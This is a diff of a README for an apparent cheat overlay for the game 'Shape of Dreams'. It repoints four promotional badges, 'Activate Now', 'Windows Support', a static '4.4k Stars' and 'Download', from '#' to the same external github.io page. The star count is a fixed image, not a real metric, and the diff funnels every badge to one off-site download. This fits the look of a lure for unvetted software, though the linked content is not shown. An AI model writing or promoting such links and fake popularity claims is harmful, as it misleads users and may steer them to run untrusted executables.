@@ -11,10 +11,10 @@ Shape of Dreams is a world of atmosphere and challenge, but sometimes you want t
 \[!IMPORTANT]
 The overlay does not alter game files. It runs in memory and is fully reversible once disabled.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 4.4k Stars](https://img.shields.io/badge/⭐️%204.4k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](https://shape-of-dreams-overlay.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://shape-of-dreams-overlay.github.io/.github/)
+[![⭐️ 4.4k Stars](https://img.shields.io/badge/⭐️%204.4k-Stars-yellow?style=for-the-badge\&logo=github)](https://shape-of-dreams-overlay.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://shape-of-dreams-overlay.github.io/.github/)
 
 ---
 
